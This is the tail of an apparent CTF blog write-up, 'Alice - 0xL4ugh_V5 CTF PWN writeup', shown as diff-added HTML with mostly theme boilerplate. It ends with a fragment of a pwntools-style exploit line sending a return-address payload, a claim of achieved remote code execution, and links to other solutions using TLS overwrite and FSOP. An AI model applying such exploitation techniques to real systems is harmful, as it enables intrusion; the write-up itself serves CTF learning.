class="hljs-number">8</span>,<span class="hljs-number">768</span>, p64(ret)+ payload)<br><br></code></pre></td></tr></table></figure>
+<p>&amp; that’s it we get an RCE.</p>
+<p>:))</p>
+<p>You can find other solvers here:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://discord.com/channels/797221129499443241/1462467876291219641/1464971063179083981">TLS overwrite</a></li>
+<li><a target="_blank" rel="noopener" href="https://discord.com/channels/797221129499443241/1462467876291219641/1464970219075145752">FSOP </a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Alice - 0xL4ugh_V5 CTF PWN writeup</div>
+      <div>https://stortny.github.io/2026/01/30/Alice-0xL4ugh-V5-CTF-PWN-writeup-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>stortny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 30, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/28/CyberSpark-CTF%E2%80%94-RSA-writeups/" title="CyberSpark CTF— RSA writeups">
+                        <span class="hidden-mobile">CyberSpark CTF— RSA writeups</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
